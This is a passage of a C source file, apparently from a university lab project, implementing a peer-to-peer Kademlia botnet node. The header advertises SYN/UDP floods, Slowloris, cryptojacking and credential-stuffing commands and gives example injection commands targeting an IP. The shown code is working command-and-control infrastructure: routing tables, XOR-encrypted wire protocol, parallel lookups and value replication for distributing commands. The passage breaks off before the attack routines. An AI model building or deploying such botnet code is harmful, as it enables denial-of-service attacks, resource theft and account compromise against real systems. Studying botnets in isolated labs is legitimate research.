/*
 * ====================================================
 *  AUA CS 232/337 — Botnet Research Project
 *  Component: Phase 3 — Kademlia P2P DHT Botnet Node (C)
 *  ENHANCED — Fully interoperable with p2p_node.py
 *  ISOLATED VM LAB ONLY
 *
 *  Compile:
 *    gcc -O2 -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
 *
 *  Usage:
 *    Seed node  : sudo ./kademlia_p2p --host 192.168.100.10 --port 7400
 *    Bot node   : sudo ./kademlia_p2p --host 192.168.100.11 --port 7400 \
 *                   --bootstrap 192.168.100.10:7400
 *    Multi-seed : sudo ./kademlia_p2p --host 192.168.100.12 --port 7400 \
 *                   --bootstrap 192.168.100.10:7400 \
 *                   --bootstrap 192.168.100.11:7400
 *    Inject cmd : sudo ./kademlia_p2p --inject \
 *                   '{"type":"syn_flood","target":"192.168.100.20","port":80,"duration":15}' \
 *                   --bootstrap 192.168.100.10:7400
 *    Demo       : sudo ./kademlia_p2p --demo
 *
 *  Enhancements over original kademlia_p2p.c:
 *    ✓ Binary wire format — fully compatible with p2p_node.py (C↔Python mesh)
 *    ✓ Thread-safe routing_find_closest — heap-allocated, no static buffers
 *    ✓ Parallel ALPHA=3 iterative lookups via pthreads
 *    ✓ Multiple --bootstrap seeds (up to MAX_SEEDS=16)
 *    ✓ In-process raw-socket SYN/UDP flood, TCP Slowloris, CPU cryptojack
 *    ✓ cred_stuffing command type (spawns cred_stuffing.py, mirrors bot_agent.c)
 *    ✓ Attack management: stop_all / shutdown command types
 *    ✓ Ring-buffer dedup (256 entries — up from 64)
 *    ✓ Value replication thread (re-stores local values every REPLICATE_SEC)
 *    ✓ Status thread (prints stats every STATUS_SEC)
 *    ✓ 5-node local demo (up from 3), with 40% resilience kill test
 *    ✓ /dev/urandom seeding
 *    ✓ SIGINT handler for graceful shutdown
 *    ✓ Fixed UDP-flood dead-code overwrite bug
 *
 *  Wire format (shared with p2p_node.py):
 *    HDR [35 bytes]: [1 type][8 msg_id][20 sender_id][4 sender_ip NBO][2 sender_port NBO]
 *    PING        : HDR
 *    PONG        : HDR
 *    FIND_NODE   : HDR + [20 target_id]
 *    FOUND_NODES : HDR + [1 count] + count × [20 id][4 ip NBO][2 port NBO]
 *    STORE       : HDR + [20 key][2 val_len NBO][val_len bytes value]
 *    FIND_VALUE  : HDR + [20 key]
 *    FOUND_VALUE : HDR + [20 key][2 val_len NBO][val_len bytes value]
 *    STOP_ALL    : HDR
 *    SHUTDOWN    : HDR
 *    Encryption  : XOR with SHA-256("AUA_P2P_MESH_KEY") keystream (same as py)
 * ====================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <math.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/sha.h>

/* ── Constants ───────────────────────────────────────────────── */
#define ID_BYTES         20          /* 160-bit SHA-1 node ID           */
#define K                8           /* k-bucket capacity               */
#define ALPHA            3           /* concurrency factor for lookups   */
#define BUCKET_COUNT     160         /* one bucket per ID bit position   */
#define MAX_SEEDS        16          /* max bootstrap seeds              */
#define MAX_KV_ENTRIES   256         /* local KV store capacity          */
#define MAX_VALUE_LEN    2048        /* max stored value bytes           */
#define UDP_BUF          4096        /* UDP receive buffer               */
#define PING_TIMEOUT_MS  2000        /* PING response timeout (ms)       */
#define FIND_TIMEOUT_MS  3000        /* FIND_NODE response timeout (ms)  */
#define REFRESH_SEC      300         /* bucket refresh interval          */
#define POLL_SEC         30          /* command poll interval            */
#define REPLICATE_SEC    3600        /* value replication interval       */
#define STATUS_SEC       60          /* status print interval            */
#define MAX_ITER         20          /* max iterative lookup rounds      */
#define EXEC_HISTORY     256         /* command dedup ring-buffer size   */
#define MAX_ATTACKS      8           /* simultaneous attack slots        */
#define SLOWLORIS_SOCKS  150         /* Slowloris socket pool size       */
#define CONTACT_SIZE     (ID_BYTES + 4 + 2)   /* 26 bytes per contact on wire */
#define HDR_SIZE         (1 + 8 + ID_BYTES + 4 + 2)   /* 35 bytes header  */

/* Message types — identical to p2p_node.py MSG.* */
#define MSG_PING         0x01
#define MSG_PONG         0x02
#define MSG_FIND_NODE    0x03
#define MSG_FOUND_NODES  0x04
#define MSG_STORE        0x05
#define MSG_FIND_VALUE   0x06
#define MSG_FOUND_VALUE  0x07
#define MSG_STOP_ALL     0x08
#define MSG_SHUTDOWN     0x09

static const char *P2P_SECRET  = "AUA_P2P_MESH_KEY";
static const char *COMMAND_KEY = "botnet_command_v1";

/* ── Data structures ─────────────────────────────────────────── */

typedef uint8_t NodeID[ID_BYTES];

typedef struct {
    NodeID   id;
    uint32_t ip;        /* network byte order */
    uint16_t port;      /* network byte order */
    time_t   last_seen;
    int      fail_count;
} Contact;

typedef struct {
    Contact contacts[K];
    int     count;
    pthread_mutex_t lock;
} KBucket;

typedef struct {
    KBucket  buckets[BUCKET_COUNT];
    NodeID   self_id;
} RoutingTable;

typedef struct {
    uint8_t  key[ID_BYTES];
    char     value[MAX_VALUE_LEN];
    int      value_len;
    time_t   stored_at;
    int      used;
} KVEntry;

typedef struct {
    KVEntry  entries[MAX_KV_ENTRIES];
    pthread_mutex_t lock;
} KVStore;

/* Pending RPC — heap-allocated, linked list */
typedef struct PendingRPC PendingRPC;
struct PendingRPC {
    uint8_t     msg_id[8];
    uint8_t     response_buf[UDP_BUF];
    int         response_len;
    int         done;
    pthread_mutex_t lock;
    pthread_cond_t  cond;
    PendingRPC *next;
};

/* Attack thread arguments */
typedef struct {
    volatile int stop;
    char   target[64];
    int    port;
    int    duration;
    double cpu;         /* cryptojack: fraction 0-1 */
} AttackArgs;

typedef struct {
    char      type[32];
    pthread_t tid;
    AttackArgs *args;   /* heap-allocated; freed when attack finishes */
    int       active;
} AttackSlot;

typedef struct KademliaNode KademliaNode;
struct KademliaNode {
    int             sock;
    NodeID          self_id;
    uint32_t        self_ip;    /* NBO */
    uint16_t        self_port;  /* NBO */
    RoutingTable    routing;
    KVStore         store;
    volatile int    running;
    pthread_t       recv_tid;
    pthread_t       refresh_tid;
    pthread_t       poll_tid;
    pthread_t       replicate_tid;
    pthread_t       status_tid;
    PendingRPC     *pending_head;
    pthread_mutex_t pending_lock;
    /* Ring-buffer dedup for executed commands */
    uint8_t         exec_hashes[EXEC_HISTORY][ID_BYTES];
    int             exec_count;
    pthread_mutex_t exec_lock;
    /* Active attack slots */
    AttackSlot      attacks[MAX_ATTACKS];
    pthread_mutex_t attack_lock;
};

/* Global node pointer for SIGINT handler */
static KademliaNode *g_node = NULL;

/* ── Utilities ───────────────────────────────────────────────── */

/* Seed random from /dev/urandom */
static void seed_random(void) {
    uint32_t seed;
    FILE *f = fopen("/dev/urandom", "rb");
    if (f) { fread(&seed, sizeof(seed), 1, f); fclose(f); }
    else    seed = (uint32_t)(time(NULL) ^ getpid());
    srand(seed);
}

/* XOR stream cipher — matches p2p_node.py _simple_encrypt/_simple_decrypt */
static uint8_t g_key_hash[SHA256_DIGEST_LENGTH];
static pthread_once_t g_key_once = PTHREAD_ONCE_INIT;
static void init_key_hash(void) {
    SHA256((const uint8_t *)P2P_SECRET, strlen(P2P_SECRET), g_key_hash);
}
static void xor_cipher(const uint8_t *in, uint8_t *out, size_t len) {
    pthread_once(&g_key_once, init_key_hash);
    for (size_t i = 0; i < len; i++)
        out[i] = in[i] ^ g_key_hash[i % SHA256_DIGEST_LENGTH];
}

/* SHA-1 of a NUL-terminated string → NodeID */
static void sha1_str(const char *s, NodeID out) {
    SHA1((const uint8_t *)s, strlen(s), out);
}

/* NodeID from "host:port" (matches Python NodeID.from_host_port) */
static void id_from_host_port(const char *host, uint16_t port_nbo, NodeID out) {
    char buf[128];
    snprintf(buf, sizeof(buf), "%s:%u", host, (unsigned)ntohs(port_nbo));
    sha1_str(buf, out);
}

/* Random 8-byte message ID */
static void rand_msg_id(uint8_t *out) {
    for (int i = 0; i < 8; i++) out[i] = (uint8_t)(rand() & 0xFF);
}

/* Resolve hostname/IP to in_addr. Returns 0 on success. */
static int resolve_host(const char *host, struct in_addr *out) {
    if (inet_aton(host, out)) return 0;
    struct hostent *h = gethostbyname(host);
    if (!h) return -1;
    memcpy(out, h->h_addr_list[0], sizeof(*out));
    return 0;
}

/* Internet checksum (RFC 1071) */
static uint16_t inet_cksum(const void *buf, int len) {
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

/* XOR distance: bucket index = position of highest differing bit (0=LSB side) */
/* Matches p2p_node.py: d.bit_length() - 1 */
static int bucket_index(const NodeID a, const NodeID b) {
    for (int byte = 0; byte < ID_BYTES; byte++) {
        uint8_t diff = a[byte] ^ b[byte];
        if (!diff) continue;
        for (int bit = 7; bit >= 0; bit--) {
            if (diff & (1 << bit))
                return (ID_BYTES - 1 - byte) * 8 + bit;
        }
    }
    return -1;
}

/* XOR distance comparison for sorting (ascending = closer first) */
static int xor_cmp(const NodeID target, const NodeID a, const NodeID b) {
    for (int i = 0; i < ID_BYTES; i++) {
        uint8_t da = target[i] ^ a[i], db = target[i] ^ b[i];
        if (da < db) return -1;
        if (da > db) return  1;
    }
    return 0;
}

/* ── Routing Table ───────────────────────────────────────────── */

static void routing_init(RoutingTable *rt, const NodeID self_id) {
    memcpy(rt->self_id, self_id, ID_BYTES);
    for (int i = 0; i < BUCKET_COUNT; i++) {
        rt->buckets[i].count = 0;
        pthread_mutex_init(&rt->buckets[i].lock, NULL);
    }
}

/* Thread-safe find_closest: returns heap-allocated array (caller must free). */
static Contact *routing_find_closest(RoutingTable *rt, const NodeID target,
                                      int n, int *out_count) {
    /* Collect all contacts under per-bucket locks */
    int capacity = BUCKET_COUNT * K;
    Contact *pool = malloc(capacity * sizeof(Contact));
    if (!pool) { *out_count = 0; return NULL; }
    int total = 0;
    for (int i = 0; i < BUCKET_COUNT; i++) {
        KBucket *b = &rt->buckets[i];
        pthread_mutex_lock(&b->lock);
        for (int j = 0; j < b->count && total < capacity; j++)
            pool[total++] = b->contacts[j];
        pthread_mutex_unlock(&b->lock);
    }
    /* Insertion sort by XOR distance to target */
    for (int i = 1; i < total; i++) {
        Contact tmp = pool[i];
        int j = i - 1;
        while (j >= 0 && xor_cmp(target, pool[j].id, tmp.id) > 0) {
            pool[j+1] = pool[j]; j--;
        }
        pool[j+1] = tmp;
    }
    int count = (total < n) ? total : n;
    Contact *result = malloc(count * sizeof(Contact));
    if (!result) { free(pool); *out_count = 0; return NULL; }
    memcpy(result, pool, count * sizeof(Contact));
    free(pool);
    *out_count = count;
    return result;  /* caller must free() */
}

/* Forward declaration for routing_add (needs kademlia_ping) */
static int kademlia_ping(KademliaNode *n, uint32_t dst_ip, uint16_t dst_port);

static int routing_add(RoutingTable *rt, const Contact *c, KademliaNode *node) {
    if (memcmp(c->id, rt->self_id, ID_BYTES) == 0) return 0;
    int idx = bucket_index(rt->self_id, c->id);
    if (idx < 0 || idx >= BUCKET_COUNT) return 0;
    KBucket *b = &rt->buckets[idx];
    pthread_mutex_lock(&b->lock);

    /* Already present — update recency, reset fail count */
    for (int i = 0; i < b->count; i++) {
        if (memcmp(b->contacts[i].id, c->id, ID_BYTES) == 0) {
            b->contacts[i].last_seen  = time(NULL);
            b->contacts[i].fail_count = 0;
            pthread_mutex_unlock(&b->lock);
            return 1;
        }
    }
    /* Space available */
    if (b->count < K) {
        b->contacts[b->count++] = *c;
        pthread_mutex_unlock(&b->lock);
        return 1;
    }
    /* Bucket full: probe oldest (Sybil-resistant probe-before-evict) */
    Contact oldest = b->contacts[0];
    pthread_mutex_unlock(&b->lock);
    int alive = kademlia_ping(node, oldest.ip, oldest.port);
    pthread_mutex_lock(&b->lock);
    if (alive) {
        /* Oldest still alive — move to end (LRU refresh), discard newcomer */
        Contact tmp = b->contacts[0];
        memmove(b->contacts, b->contacts + 1, (K-1) * sizeof(Contact));
        b->contacts[K-1] = tmp;
        b->contacts[K-1].last_seen = time(NULL);
        pthread_mutex_unlock(&b->lock);
        return 0;
    }
    /* Oldest dead — evict it, insert newcomer at end */
    memmove(b->contacts, b->contacts + 1, (K-1) * sizeof(Contact));
    b->contacts[K-1] = *c;
    pthread_mutex_unlock(&b->lock);
    return 1;
}

static void routing_remove(RoutingTable *rt, const NodeID id) {
    int idx = bucket_index(rt->self_id, id);
    if (idx < 0 || idx >= BUCKET_COUNT) return;
    KBucket *b = &rt->buckets[idx];
    pthread_mutex_lock(&b->lock);
    for (int i = 0; i < b->count; i++) {
        if (memcmp(b->contacts[i].id, id, ID_BYTES) == 0) {
            memmove(&b->contacts[i], &b->contacts[i+1],
                    (b->count - i - 1) * sizeof(Contact));
            b->count--;
            break;
        }
    }
    pthread_mutex_unlock(&b->lock);
}

/* ── KV Store ────────────────────────────────────────────────── */

static void kvstore_init(KVStore *s) {
    memset(s, 0, sizeof(*s));
    pthread_mutex_init(&s->lock, NULL);
}

static void kvstore_put(KVStore *s, const uint8_t *key,
                         const char *val, int vlen) {
    pthread_mutex_lock(&s->lock);
    int copy = (vlen < MAX_VALUE_LEN - 1) ? vlen : MAX_VALUE_LEN - 1;
    /* Update existing entry */
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (s->entries[i].used &&
            memcmp(s->entries[i].key, key, ID_BYTES) == 0) {
            memcpy(s->entries[i].value, val, copy);
            s->entries[i].value[copy] = '\0';
            s->entries[i].value_len  = copy;
            s->entries[i].stored_at  = time(NULL);
            pthread_mutex_unlock(&s->lock);
            return;
        }
    }
    /* Find empty slot */
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (!s->entries[i].used) {
            memcpy(s->entries[i].key, key, ID_BYTES);
            memcpy(s->entries[i].value, val, copy);
            s->entries[i].value[copy] = '\0';
            s->entries[i].value_len  = copy;
            s->entries[i].stored_at  = time(NULL);
            s->entries[i].used       = 1;
            pthread_mutex_unlock(&s->lock);
            return;
        }
    }
    /* Store full — overwrite oldest entry */
    int oldest_i = 0;
    time_t oldest_t = s->entries[0].stored_at;
    for (int i = 1; i < MAX_KV_ENTRIES; i++) {
        if (s->entries[i].stored_at < oldest_t) {
            oldest_t = s->entries[i].stored_at;
            oldest_i = i;
        }
    }
    memcpy(s->entries[oldest_i].key, key, ID_BYTES);
    memcpy(s->entries[oldest_i].value, val, copy);
    s->entries[oldest_i].value[copy] = '\0';
    s->entries[oldest_i].value_len  = copy;
    s->entries[oldest_i].stored_at  = time(NULL);
    s->entries[oldest_i].used       = 1;
    pthread_mutex_unlock(&s->lock);
}

/* Returns value_len on hit, -1 on miss */
static int kvstore_get(KVStore *s, const uint8_t *key,
                        char *out, int out_len) {
    pthread_mutex_lock(&s->lock);
    for (int i = 0; i < MAX_KV_ENTRIES; i++) {
        if (s->entries[i].used &&
            memcmp(s->entries[i].key, key, ID_BYTES) == 0) {
            int copy = (s->entries[i].value_len < out_len - 1)
                       ? s->entries[i].value_len : out_len - 1;
            memcpy(out, s->entries[i].value, copy);
            out[copy] = '\0';
            pthread_mutex_unlock(&s->lock);
            return copy;
        }
    }
    pthread_mutex_unlock(&s->lock);
    return -1;
}

/* ── Wire encoding / decoding ────────────────────────────────── */

static int encode_header(uint8_t *buf, uint8_t type,
                          const uint8_t *msg_id, const NodeID sender_id,
                          uint32_t sender_ip, uint16_t sender_port) {
    buf[0] = type;
    memcpy(buf + 1,  msg_id,    8);
    memcpy(buf + 9,  sender_id, ID_BYTES);
    memcpy(buf + 29, &sender_ip,   4);
    memcpy(buf + 33, &sender_port, 2);
    return HDR_SIZE;
}

static void decode_header(const uint8_t *buf, uint8_t *type,
                           uint8_t *msg_id, NodeID sender_id,
                           uint32_t *sender_ip, uint16_t *sender_port) {
    *type = buf[0];
    memcpy(msg_id,    buf + 1,  8);
    memcpy(sender_id, buf + 9,  ID_BYTES);
    memcpy(sender_ip,   buf + 29, 4);
    memcpy(sender_port, buf + 33, 2);
}

static void send_msg(int sock, const uint8_t *raw, int len,
                     uint32_t dst_ip, uint16_t dst_port) {
    if (len <= 0 || len > (int)UDP_BUF) return;
    uint8_t enc[UDP_BUF];
    xor_cipher(raw, enc, len);
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = dst_ip;
    dst.sin_port        = dst_port;
    sendto(sock, enc, len, 0, (struct sockaddr *)&dst, sizeof(dst));
}

/* ── Pending RPC management ──────────────────────────────────── */

static PendingRPC *pending_new(const uint8_t *msg_id) {
    PendingRPC *p = calloc(1, sizeof(PendingRPC));
    if (!p) return NULL;
    memcpy(p->msg_id, msg_id, 8);
    pthread_mutex_init(&p->lock, NULL);
    pthread_cond_init(&p->cond, NULL);
    return p;
}

static void pending_add(KademliaNode *n, PendingRPC *p) {
    pthread_mutex_lock(&n->pending_lock);
    p->next = n->pending_head;
    n->pending_head = p;
    pthread_mutex_unlock(&n->pending_lock);
}

static void pending_remove(KademliaNode *n, PendingRPC *p) {
    pthread_mutex_lock(&n->pending_lock);
    PendingRPC **cur = &n->pending_head;
    while (*cur) {
        if (*cur == p) { *cur = p->next; break; }
        cur = &(*cur)->next;
    }
    pthread_mutex_unlock(&n->pending_lock);
}

static void pending_free(PendingRPC *p) {
    pthread_mutex_destroy(&p->lock);
    pthread_cond_destroy(&p->cond);
    free(p);
}

/* Block until response or timeout_ms. Returns 1 if response received. */
static int pending_wait(PendingRPC *p, int timeout_ms) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec  += timeout_ms / 1000;
    ts.tv_nsec += (long)(timeout_ms % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) {
        ts.tv_sec++;
        ts.tv_nsec -= 1000000000L;
    }
    pthread_mutex_lock(&p->lock);
    while (!p->done)
        if (pthread_cond_timedwait(&p->cond, &p->lock, &ts) == ETIMEDOUT)
            break;
    int got = p->done;
    pthread_mutex_unlock(&p->lock);
    return got;
}

/* ── Kademlia RPCs ───────────────────────────────────────────── */

static int kademlia_ping(KademliaNode *n,
                          uint32_t dst_ip, uint16_t dst_port) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE];
    encode_header(buf, MSG_PING, msg_id, n->self_id, n->self_ip, n->self_port);
    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE, dst_ip, dst_port);
    int got = pending_wait(p, PING_TIMEOUT_MS);
    pending_remove(n, p);
    pending_free(p);
    return got;
}

/* Returns number of contacts written into out_contacts (≤ max) */
static int kademlia_find_node_rpc(KademliaNode *n,
                                   uint32_t dst_ip, uint16_t dst_port,
                                   const NodeID target,
                                   Contact *out_contacts, int max) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE + ID_BYTES];
    int off = encode_header(buf, MSG_FIND_NODE, msg_id, n->self_id,
                             n->self_ip, n->self_port);
    memcpy(buf + off, target, ID_BYTES);

    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE + ID_BYTES, dst_ip, dst_port);
    int got = pending_wait(p, FIND_TIMEOUT_MS);
    int count = 0;
    if (got && p->response_len >= HDR_SIZE + 1) {
        const uint8_t *payload = p->response_buf + HDR_SIZE;
        int n_entries = payload[0];
        for (int i = 0; i < n_entries && i < max; i++) {
            const uint8_t *e = payload + 1 + i * CONTACT_SIZE;
            if (e + CONTACT_SIZE > p->response_buf + p->response_len) break;
            memcpy(out_contacts[count].id, e, ID_BYTES);
            memcpy(&out_contacts[count].ip,   e + ID_BYTES,     4);
            memcpy(&out_contacts[count].port, e + ID_BYTES + 4, 2);
            out_contacts[count].last_seen  = time(NULL);
            out_contacts[count].fail_count = 0;
            count++;
        }
    }
    pending_remove(n, p);
    pending_free(p);
    return count;
}

static int kademlia_store_rpc(KademliaNode *n,
                               uint32_t dst_ip, uint16_t dst_port,
                               const uint8_t *key,
                               const char *value, int val_len) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint16_t vlen_net = htons((uint16_t)val_len);
    int total = HDR_SIZE + ID_BYTES + 2 + val_len;
    uint8_t *buf = malloc(total);
    if (!buf) return 0;
    int off = encode_header(buf, MSG_STORE, msg_id, n->self_id,
                             n->self_ip, n->self_port);
    memcpy(buf + off, key,       ID_BYTES); off += ID_BYTES;
    memcpy(buf + off, &vlen_net, 2);        off += 2;
    memcpy(buf + off, value,     val_len);

    PendingRPC *p = pending_new(msg_id);
    if (!p) { free(buf); return 0; }
    pending_add(n, p);
    send_msg(n->sock, buf, total, dst_ip, dst_port);
    free(buf);
    int got = pending_wait(p, PING_TIMEOUT_MS);
    pending_remove(n, p);
    pending_free(p);
    return got;
}

/* Returns 1 + fills value_out if value found; 0 + fills contacts_out if not. */
static int kademlia_find_value_rpc(KademliaNode *n,
                                    uint32_t dst_ip, uint16_t dst_port,
                                    const uint8_t *key,
                                    char *value_out, int val_max,
                                    Contact *contacts_out, int *n_contacts) {
    uint8_t msg_id[8]; rand_msg_id(msg_id);
    uint8_t buf[HDR_SIZE + ID_BYTES];
    int off = encode_header(buf, MSG_FIND_VALUE, msg_id, n->self_id,
                             n->self_ip, n->self_port);
    memcpy(buf + off, key, ID_BYTES);

    PendingRPC *p = pending_new(msg_id);
    if (!p) return 0;
    pending_add(n, p);
    send_msg(n->sock, buf, HDR_SIZE + ID_BYTES, dst_ip, dst_port);
    int got = pending_wait(p, FIND_TIMEOUT_MS);
    int found = 0;
    if (got && p->response_len >= HDR_SIZE) {
        uint8_t type = p->response_buf[0];
        const uint8_t *payload = p->response_buf + HDR_SIZE;
        int plen = p->response_len - HDR_SIZE;
        if (type == MSG_FOUND_VALUE && plen >= ID_BYTES + 2) {
            uint16_t vlen_net;
            memcpy(&vlen_net, payload + ID_BYTES, 2);
            int vlen = (int)ntohs(vlen_net);
            int copy = (vlen < val_max - 1) ? vlen : val_max - 1;
            memcpy(value_out, payload + ID_BYTES + 2, copy);
            value_out[copy] = '\0';
            found = 1;
        } else if (type == MSG_FOUND_NODES && plen >= 1 &&
                   n_contacts && contacts_out) {
            int cnt = payload[0];
            *n_contacts = 0;
            for (int i = 0; i < cnt; i++) {
                const uint8_t *e = payload + 1 + i * CONTACT_SIZE;
                if (e + CONTACT_SIZE > p->response_buf + p->response_len) break;
                memcpy(contacts_out[*n_contacts].id, e, ID_BYTES);
                memcpy(&contacts_out[*n_contacts].ip,   e + ID_BYTES,     4);
                memcpy(&contacts_out[*n_contacts].port, e + ID_BYTES + 4, 2);
                contacts_out[*n_contacts].last_seen  = time(NULL);
                contacts_out[*n_contacts].fail_count = 0;
                (*n_contacts)++;
            }
        }
    }
    pending_remove(n, p);
    pending_free(p);
    return found;
}

/* ── Parallel iterative FIND_NODE ───────────────────────────── */

typedef struct {
    KademliaNode *n;
    uint32_t      dst_ip;
    uint16_t      dst_port;
    NodeID        target;
    Contact       results[K];
    int           n_results;
} FindNodeTask;

static void *find_node_worker(void *arg) {
    FindNodeTask *t = arg;
    t->n_results = kademlia_find_node_rpc(t->n, t->dst_ip, t->dst_port,
                                           t->target, t->results, K);
    return NULL;
}

static int id_in_set(const NodeID id, const uint8_t set[][ID_BYTES], int n) {
    for (int i = 0; i < n; i++)
        if (memcmp(set[i], id, ID_BYTES) == 0) return 1;
    return 0;
}

static int id_in_contacts(const NodeID id, const Contact *cs, int n) {
    for (int i = 0; i < n; i++)
        if (memcmp(cs[i].id, id, ID_BYTES) == 0) return 1;
    return 0;
}

static void contacts_insertion_sort(Contact *cs, int n, const NodeID target) {
    for (int i = 1; i < n; i++) {
        Contact tmp = cs[i]; int j = i - 1;
        while (j >= 0 && xor_cmp(target, cs[j].id, tmp.id) > 0) {
            cs[j+1] = cs[j]; j--;
        }
        cs[j+1] = tmp;
    }
}

/* Returns number of closest contacts written into result (≤ max) */
static int iterative_find_node(KademliaNode *n, const NodeID target,
                                Contact *result, int max) {
    int n_closest = 0;
    Contact *initial = routing_find_closest(&n->routing, target, K, &n_closest);
    if (!initial) return 0;

    Contact  closest[K * 2];
    int      n_cl = (n_closest < K*2) ? n_closest : K*2;
    memcpy(closest, initial, n_cl * sizeof(Contact));
    free(initial);

    uint8_t queried[BUCKET_COUNT * K][ID_BYTES];
    int     n_queried = 0;

    for (int iter = 0; iter < MAX_ITER; iter++) {
        /* Pick up to ALPHA unqueried contacts */
        FindNodeTask tasks[ALPHA];
        pthread_t    threads[ALPHA];
        int q_count = 0;
        for (int i = 0; i < n_cl && q_count < ALPHA; i++) {
            if (!id_in_set(closest[i].id, queried, n_queried)) {
                tasks[q_count].n        = n;
                tasks[q_count].dst_ip   = closest[i].ip;
                tasks[q_count].dst_port = closest[i].port;
                memcpy(tasks[q_count].target, target, ID_BYTES);
                if (n_queried < BUCKET_COUNT * K)
                    memcpy(queried[n_queried++], closest[i].id, ID_BYTES);
                q_count++;
            }
        }
        if (q_count == 0) break;

        /* Fire ALPHA queries in parallel */
        for (int i = 0; i < q_count; i++)
            pthread_create(&threads[i], NULL, find_node_worker, &tasks[i]);
        for (int i = 0; i < q_count; i++)
            pthread_join(threads[i], NULL);

        /* Merge results */
        int any_new = 0;
        for (int i = 0; i < q_count; i++) {
            for (int j = 0; j < tasks[i].n_results; j++) {
                Contact *nc = &tasks[i].results[j];
                routing_add(&n->routing, nc, n);
                if (!id_in_contacts(nc->id, closest, n_cl) &&
                    n_cl < K * 2) {
                    closest[n_cl++] = *nc;
                    any_new = 1;
                }
            }
        }
        if (!any_new) break;
        contacts_insertion_sort(closest, n_cl, target);
        if (n_cl > K) n_cl = K;
    }

    int out = (n_cl < max) ? n_cl : max;
    memcpy(result, closest, out * sizeof(Contact));
    return out;
}

/* ── Parallel iterative FIND_VALUE ──────────────────────────── */

typedef struct {
    KademliaNode *n;
    uint32_t      dst_ip;
    uint16_t      dst_port;
    uint8_t       key[ID_BYTES];
    char          found_val[MAX_VALUE_LEN];
    int           found;
    Contact       closer[K];
    int           n_closer;
} FindValueTask;

static void *find_value_worker(void *arg) {
    FindValueTask *t = arg;
    t->found = kademlia_find_value_rpc(t->n, t->dst_ip, t->dst_port,
                                        t->key,
                                        t->found_val, MAX_VALUE_LEN,
                                        t->closer, &t->n_closer);
    return NULL;
}

static int iterative_find_value(KademliaNode *n, const uint8_t *key,
                                 char *value_out, int val_max) {
    int n_closest = 0;
    Contact *initial = routing_find_closest(&n->routing, key, K, &n_closest);
    if (!initial) return 0;

    Contact closest[K * 2];
    int     n_cl = (n_closest < K*2) ? n_closest : K*2;
    memcpy(closest, initial, n_cl * sizeof(Contact));
    free(initial);

    uint8_t queried[BUCKET_COUNT * K][ID_BYTES];
    int     n_queried = 0;

    for (int iter = 0; iter < MAX_ITER; iter++) {
        FindValueTask tasks[ALPHA];
        pthread_t     threads[ALPHA];
        int q_count = 0;
        for (int i = 0; i < n_cl && q_count < ALPHA; i++) {
            if (!id_in_set(closest[i].id, queried, n_queried)) {
                tasks[q_count].n        = n;
                tasks[q_count].dst_ip   = closest[i].ip;
                tasks[q_count].dst_port = closest[i].port;
                memcpy(tasks[q_count].key, key, ID_BYTES);
                if (n_queried < BUCKET_COUNT * K)
                    memcpy(queried[n_queried++], closest[i].id, ID_BYTES);
                q_count++;
            }
        }
        if (q_count == 0) break;

        for (int i = 0; i < q_count; i++)
            pthread_create(&threads[i], NULL, find_value_worker, &tasks[i]);
        for (int i = 0; i < q_count; i++)
            pthread_join(threads[i], NULL);

        /* Check for early return if any query found the value */
        for (int i = 0; i < q_count; i++) {
            if (tasks[i].found) {
                int copy = (int)strlen(tasks[i].found_val);
                if (copy > val_max - 1) copy = val_max - 1;
                memcpy(value_out, tasks[i].found_val, copy);
                value_out[copy] = '\0';
                return 1;
            }
        }

        /* Merge closer nodes */
        int any_new = 0;
        for (int i = 0; i < q_count; i++) {
            for (int j = 0; j < tasks[i].n_closer; j++) {
                Contact *nc = &tasks[i].closer[j];
                routing_add(&n->routing, nc, n);
                if (!id_in_contacts(nc->id, closest, n_cl) &&
                    n_cl < K * 2) {
                    closest[n_cl++] = *nc;
                    any_new = 1;
                }
            }
        }
        if (!any_new) break;
        contacts_insertion_sort(closest, n_cl, key);
        if (n_cl > K) n_cl = K;
    }
    return 0;
}

/* ── Store value on K closest nodes ─────────────────────────── */
static int store_value(KademliaNode *n, const uint8_t *key,
                        const char *value, int val_len) {
    kvstore_put(&n->store, key, value, val_len);
    Contact recipients[K]; int n_recip = 0;
    n_recip = iterative_find_node(n, key, recipients, K);
    int acks = 0;
    for (int i = 0; i < n_recip; i++)
        if (kademlia_store_rpc(n, recipients[i].ip, recipients[i].port,
                                key, value, val_len)) acks++;
    printf("[P2P] Stored value on %d/%d nodes\n", acks, n_recip);
    return acks;
}

/* ── Handle incoming RPC ─────────────────────────────────────── */
static void handle_incoming(KademliaNode *n, const uint8_t *buf, int len) {
    if (len < HDR_SIZE) return;
    uint8_t  type, msg_id[8];
    NodeID   sender_id;
    uint32_t sender_ip;
    uint16_t sender_port;
    decode_header(buf, &type, msg_id, sender_id, &sender_ip, &sender_port);

    /* Add sender to routing table */
    Contact c;
    memcpy(c.id, sender_id, ID_BYTES);
    c.ip = sender_ip; c.port = sender_port;
    c.last_seen = time(NULL); c.fail_count = 0;
    routing_add(&n->routing, &c, n);

    const uint8_t *payload = buf + HDR_SIZE;
